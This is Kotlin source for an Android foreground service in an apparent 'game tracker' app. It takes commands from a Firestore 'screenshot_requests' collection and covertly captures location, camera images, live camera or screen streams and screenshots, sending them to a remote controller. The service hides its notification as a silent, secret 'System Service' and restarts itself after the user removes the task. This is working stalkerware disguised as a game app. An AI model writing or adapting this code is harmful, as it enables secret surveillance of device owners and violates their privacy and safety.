package com.example.game_tracker

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.example.game_tracker.MediaProjectionStore

class ForegroundService : Service() {

    companion object {
        const val CHANNEL_ID = "ludo_bg_service_channel"
        const val NOTIFICATION_ID = 1001

        fun startService(context: Context) {
            try {
                val intent = Intent(context, ForegroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private var firestoreListener: ListenerRegistration? = null
    private var locationManager: LocationManager? = null
    private var locationListener: LocationListener? = null

    override fun onCreate() {
        super.onCreate()
        try {
            createNotificationChannel()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun hasLocationPermission(): Boolean {
        return (androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
        androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_COARSE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        val fgsType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (hasLocationPermission()) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            } else {
                0
            }
        } else {
            0
        }

        try {
            if (fgsType != 0) {
                startForeground(NOTIFICATION_ID, notification, fgsType)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Throwable) {
            Log.e("ForegroundService", "startForeground error: ${e.message}")
        }

        setupFirestoreRequestListener()

        return START_STICKY
    }

    private fun fetchLocationOnce(requestId: String? = null) {
        try {
            if (!hasLocationPermission()) {
                if (!requestId.isNullOrEmpty()) {
                    FirebaseFirestore.getInstance().collection("screenshot_requests").document(requestId).update(
                        mapOf(
                            "status" to "failed",
                            "error" to "Location permission not granted",
                            "completedAt" to FieldValue.serverTimestamp()
                        )
                    )
                }
                return
            }

            if (locationManager == null) {
                locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            }

            val hasGps = locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true
            val hasNet = locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true

            var singleListener: LocationListener? = null
            val mainHandler = Handler(Looper.getMainLooper())

            singleListener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    try {
                        locationManager?.removeUpdates(this)
                    } catch (_: Throwable) {}
                    updateFirestoreLocation(location, requestId)
                }

                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }

            mainHandler.postDelayed({
                try {
                    singleListener.let { locationManager?.removeUpdates(it) }
                } catch (_: Throwable) {}
            }, 10000L)

            if (hasGps) {
                locationManager?.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    0L,
                    0f,
                    singleListener,
                    Looper.getMainLooper()
                )
            }
            if (hasNet) {
                locationManager?.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    0L,
                    0f,
                    singleListener,
                    Looper.getMainLooper()
                )
            }

            val lastGps = if (hasGps) locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER) else null
            val lastNet = if (hasNet) locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) else null
            val bestLoc = lastGps ?: lastNet
            if (bestLoc != null) {
                updateFirestoreLocation(bestLoc, requestId)
            }
        } catch (e: SecurityException) {
            e.printStackTrace()
            if (!requestId.isNullOrEmpty()) {
                FirebaseFirestore.getInstance().collection("screenshot_requests").document(requestId).update(
                    mapOf(
                        "status" to "failed",
                        "error" to "SecurityException: ${e.message}",
                        "completedAt" to FieldValue.serverTimestamp()
                    )
                )
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun updateFirestoreLocation(location: Location, requestId: String? = null) {
        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("flutter.game_tracker_device_id", null) ?: return

        CloudBridgeSync.updateDeviceLocation(
            deviceId = deviceId,
            latitude = location.latitude,
            longitude = location.longitude,
            accuracy = location.accuracy.toDouble(),
            timestamp = System.currentTimeMillis()
        )

        if (!requestId.isNullOrEmpty()) {
            CloudBridgeSync.updateRequestStatus(
                requestId = requestId,
                status = "completed"
            )
        }
    }

    private fun markBackgroundAttempt(requestId: String) {
        try {
            FirebaseFirestore.getInstance().collection("screenshot_requests").document(requestId).update(
                mapOf("backgroundAttemptedAt" to com.google.firebase.firestore.FieldValue.serverTimestamp())
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun setupFirestoreRequestListener() {
        if (firestoreListener != null) return

        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        var deviceId = prefs.getString("flutter.game_tracker_device_id", null)
        if (deviceId.isNullOrEmpty()) {
            deviceId = prefs.getString("game_tracker_device_id", null)
        }

        if (deviceId.isNullOrEmpty() || !deviceId.startsWith("user_")) {
            prefs.registerOnSharedPreferenceChangeListener { sharedPrefs, key ->
                if (key == "flutter.game_tracker_device_id" || key == "game_tracker_device_id") {
                    setupFirestoreRequestListener()
                }
            }
            return
        }

        try {
            val firestore = FirebaseFirestore.getInstance()
            firestoreListener = firestore.collection("screenshot_requests")
                .whereEqualTo("targetDeviceId", deviceId)
                .whereEqualTo("status", "pending")
                .addSnapshotListener { snapshots, error ->
                    if (error != null || snapshots == null) return@addSnapshotListener
                    for (change in snapshots.documentChanges) {
                        if (change.type == DocumentChange.Type.ADDED || change.type == DocumentChange.Type.MODIFIED) {
                            val doc = change.document
                            val requestId = doc.id
                            val requestType = doc.getString("requestType") ?: "screenshot"
                            val cameraFacing = doc.getString("cameraFacing") ?: "front"
                            val reqTimestamp = doc.getTimestamp("requestedAt")?.toDate()?.time ?: System.currentTimeMillis()

                            // Auto-expire requests older than 10 minutes to prevent launch loops while avoiding clock-skew false expirations
                            if (System.currentTimeMillis() - reqTimestamp > 600000) {
                                firestore.collection("screenshot_requests").document(requestId).update(
                                    mapOf(
                                        "status" to "expired",
                                        "failureReason" to "Request expired before service pickup",
                                        "completedAt" to FieldValue.serverTimestamp()
                                    )
                                )
                                continue
                            }

                            when (requestType) {
                                "location_ping" -> {
                                    fetchLocationOnce(requestId)
                                }
                                "camera_capture" -> {
                                    markBackgroundAttempt(requestId)
                                    try {
                                        val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
                                            putExtra("requestId", requestId)
                                            putExtra("cameraFacing", cameraFacing)
                                        }
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            startForegroundService(svcIntent)
                                        } else {
                                            startService(svcIntent)
                                        }
                                    } catch (e: Throwable) {
                                        Log.e("ForegroundService", "CameraCaptureService start error: ${e.message}")
                                        CloudBridgeSync.updateRequestStatus(
                                            requestId = requestId,
                                            status = "failed",
                                            error = "Service start disallowed",
                                            failureReason = "OS disallowed background camera start: ${e.message}"
                                        )
                                    }
                                }
                                "screen_share", "camera_stream" -> {
                                    markBackgroundAttempt(requestId)
                                    try {
                                        val svcIntent = Intent(this, WebRtcPublisherService::class.java).apply {
                                            putExtra("requestId", requestId)
                                            putExtra("cameraFacing", cameraFacing)
                                            putExtra("requestType", requestType)
                                            val savedProjection = MediaProjectionStore.load(this@ForegroundService)
                                            if (savedProjection.first != 0 && savedProjection.second != null) {
                                                putExtra("resultCode", savedProjection.first)
                                                putExtra("resultData", savedProjection.second)
                                            }
                                        }
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            startForegroundService(svcIntent)
                                        } else {
                                            startService(svcIntent)
                                        }
                                    } catch (e: Throwable) {
                                        Log.e("ForegroundService", "WebRtcPublisherService start error: ${e.message}")
                                        CloudBridgeSync.updateRequestStatus(
                                            requestId = requestId,
                                            status = "failed",
                                            error = "Stream start disallowed",
                                            failureReason = "OS disallowed background stream start: ${e.message}"
                                        )
                                    }
                                }
                                "screenshot" -> {
                                    try {
                                        val savedProjection = MediaProjectionStore.load(this@ForegroundService)
                                        val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
                                            putExtra("requestId", requestId)
                                            putExtra("capture_once", true)
                                            if (savedProjection.first != 0 && savedProjection.second != null) {
                                                putExtra("resultCode", savedProjection.first)
                                                putExtra("resultData", savedProjection.second)
                                            }
                                        }
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            startForegroundService(svcIntent)
                                        } else {
                                            startService(svcIntent)
                                        }
                                    } catch (e: Throwable) {
                                        Log.e("ForegroundService", "ScreenCaptureService start error: ${e.message}")
                                        CloudBridgeSync.updateRequestStatus(
                                            requestId = requestId,
                                            status = "failed",
                                            error = "Screen capture start disallowed",
                                            failureReason = "OS disallowed background capture start: ${e.message}"
                                        )
                                    }
                                }
                            }
                        }
                    }
                }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartServiceIntent = Intent(applicationContext, ForegroundService::class.java).also {
            it.setPackage(packageName)
        }
        val restartServicePendingIntent = PendingIntent.getService(
            this,
            1,
            restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 1000,
            restartServicePendingIntent
        )
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        try {
            firestoreListener?.remove()
            firestoreListener = null
            if (locationListener != null && locationManager != null) {
                locationManager?.removeUpdates(locationListener!!)
            }
        } catch (e: Exception) {
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "System background service"
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                vibrationPattern = longArrayOf(0L)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .setLocalOnly(true)
            .build()
    }
}
